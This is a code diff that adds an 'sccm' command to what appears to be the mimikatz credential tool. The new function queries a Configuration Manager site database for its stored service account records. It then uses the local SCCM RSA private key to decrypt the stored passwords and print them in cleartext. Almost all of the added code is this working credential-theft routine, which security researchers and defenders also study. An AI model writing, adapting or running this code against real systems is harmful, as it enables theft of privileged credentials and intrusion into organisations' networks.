@@ -28,6 +28,7 @@ const KUHL_M_C kuhl_m_c_misc[] = {
 	{kuhl_m_misc_aadcookie,	L"aadcookie",	NULL},
 	{kuhl_m_misc_aadcookie_NgcSignWithSymmetricPopKey,	L"ngcsign",	NULL},
 	{kuhl_m_misc_spooler,	L"spooler",		NULL},
+	{kuhl_m_misc_sccm_accounts,	L"sccm",		NULL},
 };
 const KUHL_M kuhl_m_misc = {
 	L"misc",	L"Miscellaneous module",	NULL,
@@ -1396,6 +1397,141 @@ NTSTATUS kuhl_m_misc_spooler(int argc, wchar_t * argv[])
 
 	}
 	else PRINT_ERROR(L"missing /server argument to specify spooler server");
+
+	return STATUS_SUCCESS;
+}
+
+typedef struct _SCCM_ENCRYPTED_HEADER {
+	DWORD cbKey;
+	DWORD cbDecrypted;
+	BYTE data[ANYSIZE_ARRAY];
+} SCCM_ENCRYPTED_HEADER, *PSCCM_ENCRYPTED_HEADER;
+
+const wchar_t SCCM_QUERY[] = L"SELECT SiteNumber, UserName, Password, Availability FROM SC_UserAccount";
+NTSTATUS kuhl_m_misc_sccm_accounts(int argc, wchar_t * argv[])
+{
+	LPCWCHAR szConnectionString, szPrivateKeyContainer;
+
+	SQLHANDLE hEnv, hCon, hSmt;
+	SQLRETURN ret;
+	unsigned long int SiteNumber;
+	char UserName[60], Password[2048];
+	BYTE Availability;
+	SQLLEN szUserName, szPassword;
+
+	PSCCM_ENCRYPTED_HEADER pEncrypted;
+	HCRYPTPROV hProv;
+	HCRYPTKEY hKey;
+	ALG_ID algid;
+	DWORD cbEncrypted, dwKeySetFlags, cbBuffer;
+
+	kull_m_string_args_byName(argc, argv, L"keycontainer", &szPrivateKeyContainer, L"Microsoft Systems Management Server");
+	dwKeySetFlags = kull_m_string_args_byName(argc, argv, L"keyuser", NULL, NULL) ? 0 : CRYPT_MACHINE_KEYSET;
+
+	kprintf(L"[CRYPTO] Private Key Container: %s (%s)\n", szPrivateKeyContainer, (dwKeySetFlags == CRYPT_MACHINE_KEYSET) ? L"machine" : L"user");
+
+	if(kull_m_string_args_byName(argc, argv, L"connectionstring", &szConnectionString, NULL))
+	{
+		kprintf(L"[ SQL  ] ConnectionString: %s\n", szConnectionString);
+
+		SQLAllocHandle(SQL_HANDLE_ENV, SQL_NULL_HANDLE, &hEnv);
+		SQLSetEnvAttr(hEnv, SQL_ATTR_ODBC_VERSION, (SQLPOINTER)SQL_OV_ODBC3, 0);
+		SQLAllocHandle(SQL_HANDLE_DBC, hEnv, &hCon);
+
+		ret = SQLDriverConnect(hCon, NULL, (SQLWCHAR*) szConnectionString, SQL_NTS, NULL, 0, NULL, SQL_DRIVER_NOPROMPT);
+		switch (ret)
+		{
+		case SQL_SUCCESS:
+		case SQL_SUCCESS_WITH_INFO:
+			SQLAllocHandle(SQL_HANDLE_STMT, hCon, &hSmt);
+
+			kprintf(L"[ SQL  ] Query to accounts: %s\n", SCCM_QUERY);
+			ret = SQLExecDirect(hSmt, (SQLWCHAR *) SCCM_QUERY, SQL_NTS);
+			if (ret == SQL_SUCCESS)
+			{
+				/* To avoid a lots of them */
+				kprintf(L"[CRYPTO] Acquiring local SCCM RSA Private Key\n");
+				if (CryptAcquireContext(&hProv, szPrivateKeyContainer, NULL, PROV_RSA_AES, dwKeySetFlags | CRYPT_SILENT))
+				{
+					/**/
+					kprintf(L"\n");
+					while (SQLFetch(hSmt) == SQL_SUCCESS)
+					{
+						ret = SQLGetData(hSmt, 1, SQL_C_ULONG, &SiteNumber, sizeof(SiteNumber), NULL);
+						if (ret == SQL_SUCCESS)
+						{
+							ret = SQLGetData(hSmt, 2, SQL_C_CHAR, UserName, sizeof(UserName), &szUserName);
+							if (ret == SQL_SUCCESS)
+							{
+								ret = SQLGetData(hSmt, 3, SQL_C_CHAR, Password, sizeof(Password), &szPassword);
+								if (ret == SQL_SUCCESS)
+								{
+									ret = SQLGetData(hSmt, 4, SQL_C_TINYINT, &Availability, sizeof(Availability), NULL);
+									if (ret == SQL_SUCCESS)
+									{
+										kprintf(L"[%u-%hhu] %.*S - ", SiteNumber, Availability, szUserName, UserName);
+										if (kull_m_crypto_StringToBinaryA(Password, (DWORD)szPassword, CRYPT_STRING_HEX, (PBYTE*)&pEncrypted, &cbEncrypted))
+										{
+											if (!Availability)
+											{
+												if (CryptImportKey(hProv, pEncrypted->data, pEncrypted->cbKey, 0, 0, &hKey))
+												{
+													cbBuffer = sizeof(ALG_ID);
+													if (CryptGetKeyParam(hKey, KP_ALGID, (BYTE*)&algid, &cbBuffer, 0))
+													{
+														kprintf(L"[%s] ", kull_m_crypto_algid_to_name(algid));
+													}
+
+													cbBuffer = cbEncrypted - FIELD_OFFSET(SCCM_ENCRYPTED_HEADER, data) - pEncrypted->cbKey;
+													if (CryptDecrypt(hKey, 0, TRUE, 0, pEncrypted->data + pEncrypted->cbKey, &cbBuffer))
+													{
+														if (cbBuffer == pEncrypted->cbDecrypted)
+														{
+															kprintf(L"%.*S\n", cbBuffer, pEncrypted->data + pEncrypted->cbKey);
+														}
+														else PRINT_ERROR(L"cbBuffer != cbDecrypted");
+													}
+													else PRINT_ERROR_AUTO(L"CryptDecrypt");
+
+													CryptDestroyKey(hKey);
+												}
+												else PRINT_ERROR_AUTO(L"CryptImportKey");
+											}
+											else kprintf(L"{todo if needed} \n"); // SELECT Name, Value1, Value2 FROM SC_SiteDefinition_Property WHERE Name LIKE 'GlobalAccount:%' (AES256 decrypt)
+
+											LocalFree(pEncrypted);
+										}
+									}
+									else PRINT_ERROR(L"SQLGetData(Availability): %u (0x%08x)\n", ret, ret);
+								}
+								else PRINT_ERROR(L"SQLGetData(Password): %u (0x%08x)\n", ret, ret);
+							}
+							else PRINT_ERROR(L"SQLGetData(UserName): %u (0x%08x)\n", ret, ret);
+						}
+						else PRINT_ERROR(L"SQLGetData(SiteNumber): %u (0x%08x)\n", ret, ret);
+					}
+					kprintf(L"\n");
+					/**/
+					kprintf(L"[CRYPTO] Releasing local SCCM RSA Private Key\n");
+					CryptReleaseContext(hProv, 0);
+				}
+				else PRINT_ERROR_AUTO(L"CryptAcquireContext");
+				/* No more crypto */
+			}
+			else PRINT_ERROR(L"SQLExecDirect: %u (0x%08x)\n", ret, ret);
+			SQLFreeHandle(SQL_HANDLE_STMT, hSmt);
+
+			break;
+
+		default:
+			PRINT_ERROR(L"SQLDriverConnect: %u (0x%08x)\n", ret, ret);
+		}
+
+		SQLDisconnect(hCon);
+		SQLFreeHandle(SQL_HANDLE_DBC, hCon);
+		SQLFreeHandle(SQL_HANDLE_ENV, hEnv);
+	}
+	else PRINT_ERROR(L"/connectionstring is needed, example: /connectionstring:\"DRIVER={SQL Server};Trusted=true;DATABASE=CM_PRD;SERVER=myserver.fqdn\\instancename;\"\n");
 
 	return STATUS_SUCCESS;
 }
